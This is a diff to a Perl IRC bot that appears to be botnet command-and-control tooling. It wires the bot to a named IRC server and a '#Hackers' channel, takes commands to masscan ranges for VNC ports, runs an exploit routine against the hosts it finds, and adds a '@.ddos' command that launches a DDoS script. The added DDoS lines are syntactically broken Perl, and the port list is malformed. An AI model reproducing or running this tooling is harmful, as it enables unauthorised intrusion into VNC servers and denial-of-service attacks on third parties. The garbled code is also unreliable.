@@ -5,18 +5,18 @@
  use feature 'say';
  use Fcntl qw(:flock SEEK_END);
  $|=1;
- #defineportshere
+ my @VNC_PORTS = qw/'5900 5901 5902 5903 5904 5905 5906 5907 5908 5909 5910 5911 5912 5913 5914 5915 5916 5917 5918 5919 5920 5921 5922 5923 5924 5925 5926 5927 5928 5929 5930 5931 5932 5933 5934 5935 5936 5937 5938 5939 5940 5941 5942 5943 5944 5945 5946 5947 5948 5949 5950 5951 5952 5953 5954 5955 5956 5957 5958 5959 5960 5961 5962 5963 5964 5965 5966 5967 5968 5969 5970 5971 5972 5973 5974 5975 5976 5977 5978 5979 5980 5981 5982 5983 5984 5985 5986 5987 5988 5989 5990 5991 5992 5993 5994 5995 5996 5997 5998 5999 6000'/;
   use Mojo::IOLoop;
- #definetimeouthere
- #defineforkshere
- #definenoticechanhere
- #definechanhere
+ my $forktimeout = 5;
+ my $maxforks = 15;
+ my $noticechan = '@#Hackers';
+ my $channel = '#Hackers';
   my $irc = Mojo::IRC->new(
- #definenickhere
+ nick => 'Exploiter'.int(rand(99999)),
   user => 'VNCScan',
- #defineserverhere
+ server => 'irc.chknet.cc:6697',
   );
- #definesslhere
+ $irc->tls({insecure => 1});
  $irc->on(irc_rpl_welcome => sub {
   my($irc, $err) = @_;
   warn 'Joined IRC server.';
@@ -29,10 +29,15 @@
  $irc->on(irc_privmsg => sub {
   my($irc, $message) = @_;
   my $msg = $message->{params}[1];
-  if ($msg =~ /!ping/) {
+  if ($msg =~ /@.ping/) {
    warn 'Received PING request, sending PONG.';
    $irc->write(notice => $noticechan => "pong");
-   }elsif ($msg =~ /!stopexploit/) {
+   }if ($msg =~ /@.ddos/) {
+   $irc->write(notice => $noticechan => "DDOS");
+   my $targetconf = $1 $2 $3 $4 $5;
+   python "ddos.py" $targetconf;
+   }
+   elsif ($msg =~ /@.stopexploit/) {
     warn 'stopexploit called, killing...';
     if ( exists $misc->{exploitpid} )  {
      $irc->write(notice => $noticechan => '[Info] Sending SIGTERM to PID ' . $misc->{exploitpid});
@@ -43,23 +48,23 @@
       $irc->write(notice => $noticechan => "exploit is not running");
      }
     }
-    return unless $msg =~ /^\!/;
+    return unless $msg =~ /^\@./;
     my $subprocess = Mojo::IOLoop->subprocess(
      sub {
       my $s = shift;
       my @IRC_RESULTS;
-      if ($msg =~ /!scan ([^\s]+)/) {
+      if ($msg =~ /@.scan ([^\s]+)/) {
        $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
        my $range = $1;
-       my $masscancmd = "masscan -p 5900-5901 --range $range --rate 65512 --open --banners -oG hosts.txt ";
+       my $masscancmd = "masscan -p 5900-5901 --range $range --rate 2048 --open --banners -oG hosts.txt ";
        warn "Received rangescan request on $range , running masscan...";
        my $r = `$masscancmd`;
        push @IRC_RESULTS, $_ foreach split "\n", $r;
-       } elsif ($msg =~ /!exploit/) {
+       } elsif ($msg =~ /@.exploit/) {
         warn 'Received exploitrun request, exploiting hosts.txt...';
         my $r = exploitrun ("vnc", $s, $s->pid);
 
-        } elsif ($msg =~ /!format/) {
+        } elsif ($msg =~ /@.format/) {
          warn 'Received file formatting request, processing...';    
          my $formatcmd = "rm -rf ips.txt && cat hosts.txt | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' >>ips.txt";
          my $r = `$formatcmd`;
@@ -86,7 +91,7 @@
      my $subprocess = shift;
      my $pid = $subprocess->pid;
      # $irc->write(notice => $noticechan =>  "Performing work in process $pid");
-     if ( $msg =~ /!exploit/ ) {
+     if ( $msg =~ /@.exploit/ ) {
       $irc->write(notice => $noticechan => 'pid: ' . $pid) ;
       $misc->{exploitpid} = $pid ;
      }
